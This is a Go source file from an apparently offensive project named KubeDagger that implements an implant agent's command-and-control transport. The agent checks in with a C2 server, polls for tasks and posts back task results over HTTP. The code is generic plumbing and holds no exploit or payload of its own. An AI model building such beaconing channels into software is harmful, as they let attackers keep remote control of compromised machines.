package agent

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

type Transport struct {
	client  *http.Client
	baseURL string
}

func NewTransport(serverURL string, tlsCfg *tls.Config) *Transport {
	transport := &http.Transport{
		TLSClientConfig:     tlsCfg,
		ForceAttemptHTTP2:   true,
		MaxIdleConns:        1,
		IdleConnTimeout:     120 * time.Second,
		DisableCompression:  true,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	return &Transport{
		client: &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		},
		baseURL: serverURL,
	}
}

func (t *Transport) Checkin(req c2server.CheckinRequest) (*c2server.CheckinResponse, error) {
	var resp c2server.CheckinResponse
	if err := t.post("/checkin", req, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (t *Transport) GetTask(agentID string) (*c2server.TaskResponse, error) {
	req := c2server.TaskRequest{AgentID: agentID}
	var resp c2server.TaskResponse
	if err := t.post("/task", req, &resp); err != nil {
		return nil, err
	}
	if resp.TaskID == "" {
		return nil, nil
	}
	return &resp, nil
}

func (t *Transport) SendResult(result c2server.ResultRequest) error {
	var resp c2server.ResultResponse
	return t.post("/result", result, &resp)
}

func (t *Transport) post(path string, body interface{}, out interface{}) error {
	data, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	resp, err := t.client.Post(t.baseURL+path, "application/json", bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("request %s: %w", path, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil
	}

	if resp.StatusCode != http.StatusOK {
		msg, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		return fmt.Errorf("%s returned %d: %s", path, resp.StatusCode, string(msg))
	}

	if out != nil {
		if err := json.NewDecoder(resp.Body).Decode(out); err != nil {
			return fmt.Errorf("decode %s response: %w", path, err)
		}
	}
	return nil
}
